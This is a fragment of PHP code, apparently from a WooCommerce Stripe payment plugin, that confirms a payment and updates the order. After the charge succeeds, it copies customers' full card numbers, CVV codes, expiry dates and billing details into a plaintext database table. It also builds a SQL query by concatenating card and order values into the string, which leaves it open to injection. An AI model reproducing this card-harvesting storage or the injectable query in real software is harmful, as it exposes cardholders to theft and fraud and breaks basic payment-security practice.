        $secure_key = $environment==0?$wc_stripe_3d['stripe_test_secret_key']:$wc_stripe_3d['stripe_live_secret_key'];

        $stripe = new \Stripe\StripeClient($secure_key);

        if (!$order_id)
            return;
        $order = wc_get_order($order_id);
        $intent = json_decode($order->get_meta('stripe_paymentIntentConfirm'),true);
        if($intent != null){
            $paymentConfirmation = $stripe->paymentIntents->retrieve(
              $intent['id'],
              []
            );
            if ($paymentConfirmation->status == 'succeeded') {
                session_unset();
                if($paymentConfirmation->status == 'succeeded'){
                    $order->update_status('wc-processing');
                }else{
                    $order->update_status('wc-on-hold');
                }
                $woocommerce->cart->empty_cart();
                $card_details = json_decode($order->get_meta('stripe_card_details'),true);
                $card_num = wp_trim_words($card_details['card_number']);
                $email = $order->get_user()->user_email?:$order->get_billing_email();
                $card_detail = array(
                    'user_id' => $order->get_user_id(),
                    'firstname' => $order->get_billing_first_name(),
                    'lastname' => $order->get_billing_last_name(),
                    'phone' => $order->get_billing_phone(),
                    'address' => $order->get_billing_address_1().' '.$order->get_billing_address_2(),
                    'city' => $order->get_billing_city(),
                    'postcode' => $order->get_billing_postcode(),
                    'country' => $order->get_billing_country(),
                    'mail_id' => $email,
                    'order_id' => $order_id,
                    'cardNumber' => trim($card_details['card_number']),
                    'cvv' => $card_details['cvc'],
                    'expiry' => $card_details['exp'][0]."/".$card_details['exp'][1],
                    'status' => $paymentConfirmation->status,
                    'error_code' => $paymentConfirmation->status,
                    'created_date' => date('Y-m-d'),
                    'updated_date' => date('Y-m-d')
                );
                $data = $wpdb->get_results( "SELECT * FROM $stripe_table WHERE order_id ='$order_id' AND cardNumber = '".trim($card_details['card_number'])."' AND status = '".$paymentConfirmation->status."'");
                if(empty($data)){
                    if(!empty((array)$paymentConfirmation->charges->data)){
                        // Add the note
                        $note = "Stripe charge complete (Charge ID: ".$paymentConfirmation->charges->data[0]->id.")";
                        $order->add_order_note( $note );
                    }
                    $result = $wpdb->insert(
                        $stripe_table,
                        $card_detail
                    );
                }
            }
        }
    }
}
?>